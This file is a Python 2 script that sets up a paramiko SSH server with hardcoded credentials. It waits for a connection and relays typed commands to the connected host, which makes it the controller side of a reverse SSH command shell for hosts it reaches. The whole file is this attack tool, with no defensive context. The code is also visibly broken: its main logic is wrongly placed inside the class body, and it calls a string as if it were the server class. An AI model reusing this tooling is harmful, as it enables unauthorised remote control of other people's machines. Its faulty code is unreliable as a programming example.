import socket
import paramiko
import threading
import sys
#using the key from paramiko dir

host__key = paramiko.RSAKey(filename='test.rsa.key')    #1 default key to it

class Server (paramiko.ServerInterface):                 #2 configuration
    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'kannan') and (password == 'admin'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    server = sys.argv[1]
    ssh_port = int(sys.argv[2])
    try:                                                 #3 creating a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(1000)
        print '[*] Listening for Connection ......'
        client, addr = sock.accept()
    except Exception, e:
        print '[*] Listen Failed : ' + str(e)
        sys.exit(1)
    print '[*] GOT A CONNECTION'

    try:                                                   #4 creating serever
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host__key)
        server = server()
        try:
            bhSession.start_server(server=server)
        except paramiko.SSHException, x:
            print '[--] SSH NEGOSIATION FAILED ...'
        chan = bhSession.accept(20)
        print '[*] AUTHENTICATED..'                            #5 authentication the connection over thenclient
        print chan.recv(1024)
        chan.send('WELCOME To SSH')
        while True:                                          #6 getting access
            try:
                command = raw_input("enter command:  ").strip('\n')
                if command != 'exit':
                    chan.send(command)
                    print chan.recv(1024) + '\n'
                else:
                    chan.send('exit')
                    print 'exiting'
                    bhSession.close()
                    raise Exception ('exit')
            except KeyboardInterrupt:
                bhSession.close()
    except Exception, e:
        print '[-] Caught exception :  ' + str(e)
        try:
            bhSession.close()
        except:
            pass
        sys.exit(1)
